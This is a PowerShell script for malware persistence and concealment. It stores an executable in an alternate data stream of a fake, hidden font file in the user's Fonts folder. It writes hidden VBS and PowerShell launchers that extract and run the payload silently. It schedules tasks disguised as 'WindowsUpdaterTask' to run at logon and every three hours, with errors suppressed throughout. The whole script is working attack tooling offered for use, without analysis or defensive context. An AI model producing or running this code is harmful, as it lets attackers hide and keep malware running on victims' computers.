$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "AgentPath not set."
    exit
}

# ---- 1. Fake font file & ADS ----
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
    attrib +h $fontDir
}
$fontFile = "$fontDir\seguibl.ttf"
if (-not (Test-Path $fontFile)) {
    Set-Content -Path $fontFile -Value "TTF fake font file - do not delete" -Encoding ASCII -Force
    attrib +h $fontFile
}

$streamName = "Zone.Identifier"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte

# ---- 2. Launcher scripts ----
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent.exe"
if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
if (`$bytes) {
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    `$env:AgentPath = `$tempAgent
    Start-Process -WindowStyle Hidden -FilePath `$tempAgent
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath

$vbsPath = "$fontDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath

# ---- 3. Scheduled tasks: at logon + every 3 hours ----
$taskLogon = "WindowsUpdaterTask"
$task3h = "WindowsUpdaterTask3h"

# Delete old tasks if they exist
schtasks /delete /tn $taskLogon /f 2>$null
schtasks /delete /tn $task3h /f 2>$null

# Task 1: at user logon
schtasks /create /tn $taskLogon /tr "wscript.exe `"$vbsPath`"" /sc onlogon /ru $env:USERNAME /f /it *>$null
$logonOk = ($LASTEXITCODE -eq 0)

# Task 2: every 3 hours (hourly with modifier 3)
schtasks /create /tn $task3h /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 3 /ru $env:USERNAME /f /it *>$null
$hourlyOk = ($LASTEXITCODE -eq 0)

if ($logonOk -and $hourlyOk) {
    Write-Output "Persistence installed: runs at logon AND every 3 hours."
} elseif ($logonOk) {
    Write-Output "Logon task OK, but 3-hour task failed. Check permissions."
} elseif ($hourlyOk) {
    Write-Output "3-hour task OK, but logon task failed."
} else {
    Write-Output "Both tasks failed. Run PowerShell as admin or check Task Scheduler."
}
